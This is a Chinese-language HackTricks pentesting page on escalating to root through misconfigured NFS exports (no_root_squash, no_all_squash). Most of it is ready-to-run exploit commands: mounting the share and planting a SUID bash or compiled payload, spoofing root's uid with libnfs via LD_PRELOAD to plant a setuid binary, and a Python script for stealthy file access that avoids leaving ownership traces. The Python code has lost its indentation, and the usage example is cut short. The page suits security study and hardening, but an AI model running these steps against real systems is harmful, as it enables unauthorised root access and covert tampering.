<details>

<summary><strong>零基础学习AWS黑客攻击到高手</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>


阅读 _ **/etc/exports** _ 文件，如果您发现某个目录被配置为 **no\_root\_squash**，那么您可以**作为客户端访问**该目录，并且**以**本地**root**的身份**写入**该目录。

**no\_root\_squash**：这个选项基本上授权客户端的root用户以root身份访问NFS服务器上的文件。这可能导致严重的安全问题。

**no\_all\_squash**：这与**no\_root\_squash**选项类似，但适用于**非root用户**。想象一下，您以nobody用户的身份获得了一个shell；检查了/etc/exports文件；存在no\_all\_squash选项；检查/etc/passwd文件；模拟一个非root用户；创建一个该用户的suid文件（通过使用nfs挂载）。以nobody用户身份执行suid并变成不同的用户。

# 权限提升

## 远程利用

如果您发现了这个漏洞，您可以利用它：

* **在客户端机器上挂载该目录**，并且**以root身份复制**到挂载文件夹中的**/bin/bash**二进制文件，并给予它**SUID**权限，然后**从受害者**机器上执行该bash二进制文件。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **在客户机上挂载该目录**，并**以 root 身份复制**我们编译好的负载到挂载文件夹内，该负载将滥用 SUID 权限，给予它**SUID**权限，并**在受害者**机器上执行该二进制文件（你可以在这里找到一些[C SUID 负载](payloads-to-execute.md#c)）。
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## 本地利用

{% hint style="info" %}
请注意，如果您能够从您的机器创建一个**隧道到受害机器，您仍然可以使用远程版本来利用这个权限提升，通过隧道传输所需的端口**。\
以下技巧适用于文件 `/etc/exports` **指定了一个IP地址**的情况。在这种情况下，您将**无法使用**任何情况下的**远程利用**，您将需要**利用这个技巧**。\
利用成功的另一个必要条件是**`/etc/export` 中的导出**必须使用 `insecure` 标志。\
\--_我不确定如果 `/etc/export` 指出了一个IP地址这个技巧是否会起作用_--
{% endhint %}

## 基本信息

这个场景涉及到在本地机器上利用一个挂载的NFS共享，利用NFSv3规范中的一个漏洞，该漏洞允许客户端指定其uid/gid，可能使未授权访问成为可能。利用包括使用 [libnfs](https://github.com/sahlberg/libnfs)，这是一个允许伪造NFS RPC调用的库。

### 编译库

编译库的步骤可能需要根据内核版本进行调整。在这个特定的案例中，fallocate系统调用被注释掉了。编译过程包括以下命令：
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### 执行漏洞利用

此漏洞利用涉及创建一个简单的C程序（`pwn.c`），该程序提升权限至root，然后执行一个shell。程序被编译，生成的二进制文件（`a.out`）被放置在共享位置，并使用`ld_nfs.so`来在RPC调用中伪造uid：

1. **编译漏洞利用代码：**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **将漏洞利用程序放置在共享位置并通过伪造uid修改其权限：**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **执行漏洞利用程序以获得root权限：**
```bash
/mnt/share/a.out
#root
```

## 额外信息：NFShell 用于隐秘文件访问
一旦获得root权限，为了与NFS共享交互而不改变所有权（以避免留下痕迹），使用Python脚本（nfsh.py）。该脚本调整uid以匹配正在访问的文件的uid，允许在没有权限问题的情况下与共享上的文件进行交互：
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
运行方式：
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
# 参考资料
* https://www.errno.fr/nfs_privesc.html


<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
